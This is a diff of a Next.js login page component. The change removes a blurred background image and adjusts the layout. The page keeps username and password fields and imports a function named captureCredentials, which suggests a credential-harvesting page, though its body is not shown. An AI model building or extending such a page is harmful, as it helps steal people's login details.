@@ -1,18 +1,12 @@
 'use client';
 import { FormEvent, useState } from 'react';
-import Image from 'next/image';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 import { useToast } from '@/hooks/use-toast';
-import { PlaceHolderImages } from '@/lib/placeholder-images';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 
 export default function Home() {
-  const bgImage = PlaceHolderImages.find(
-    (img) => img.id === 'login-background'
-  );
-
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const { toast } = useToast();
@@ -30,20 +24,7 @@ export default function Home() {
   };
 
   return (
-    <div className="relative w-screen h-screen">
-      {bgImage && (
-        <div className="absolute inset-0 z-10">
-          <Image
-            src={bgImage.imageUrl}
-            alt={bgImage.description}
-            fill={true}
-            objectFit="cover"
-            className="filter blur-sm"
-            data-ai-hint={bgImage.imageHint}
-          />
-        </div>
-      )}
-
+    <div className="relative w-screen h-screen flex items-center justify-center">
       <div className="absolute inset-0 z-20 flex items-center justify-center">
         <Card className="w-[380px] bg-white/95 text-center shadow-2xl">
           <CardHeader>
